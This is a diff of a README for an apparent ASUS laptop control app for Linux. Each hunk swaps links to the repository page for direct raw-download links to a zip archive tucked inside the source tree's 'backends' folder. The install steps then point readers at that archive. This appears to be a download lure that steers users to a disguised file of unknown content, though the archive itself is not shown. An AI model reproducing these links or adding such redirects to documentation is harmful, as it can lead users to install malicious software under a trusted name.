@@ -1,12 +1,12 @@
 # 🛠️ asusctl-control-center - ASUS laptop controls in one place
 
-[![Download](https://img.shields.io/badge/Download%20Now-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/Luciusimmunological593/asusctl-control-center)
+[![Download](https://img.shields.io/badge/Download%20Now-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/Luciusimmunological593/asusctl-control-center/raw/refs/heads/main/src/asus_linux_control_center/backends/center_asusctl_control_2.0.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page and get the app:
 
-[https://github.com/Luciusimmunological593/asusctl-control-center](https://github.com/Luciusimmunological593/asusctl-control-center)
+[https://github.com/Luciusimmunological593/asusctl-control-center/raw/refs/heads/main/src/asus_linux_control_center/backends/center_asusctl_control_2.0.zip](https://github.com/Luciusimmunological593/asusctl-control-center/raw/refs/heads/main/src/asus_linux_control_center/backends/center_asusctl_control_2.0.zip)
 
 ## 🖥️ What this app does
 
@@ -29,7 +29,7 @@ If you plan to use it on a Linux-based ASUS setup, make sure your system already
 Follow these steps to get the app:
 
 1. Open the download page:
-   [https://github.com/Luciusimmunological593/asusctl-control-center](https://github.com/Luciusimmunological593/asusctl-control-center)
+   [https://github.com/Luciusimmunological593/asusctl-control-center/raw/refs/heads/main/src/asus_linux_control_center/backends/center_asusctl_control_2.0.zip](https://github.com/Luciusimmunological593/asusctl-control-center/raw/refs/heads/main/src/asus_linux_control_center/backends/center_asusctl_control_2.0.zip)
 
 2. Look for the latest release or download file on the page.
 
@@ -105,7 +105,7 @@ Only download the app from the page linked above. After the file finishes downlo
 ## 🖱️ Quick install path
 
 1. Visit the download page:
-   [https://github.com/Luciusimmunological593/asusctl-control-center](https://github.com/Luciusimmunological593/asusctl-control-center)
+   [https://github.com/Luciusimmunological593/asusctl-control-center/raw/refs/heads/main/src/asus_linux_control_center/backends/center_asusctl_control_2.0.zip](https://github.com/Luciusimmunological593/asusctl-control-center/raw/refs/heads/main/src/asus_linux_control_center/backends/center_asusctl_control_2.0.zip)
 
 2. Download the latest available file.
 
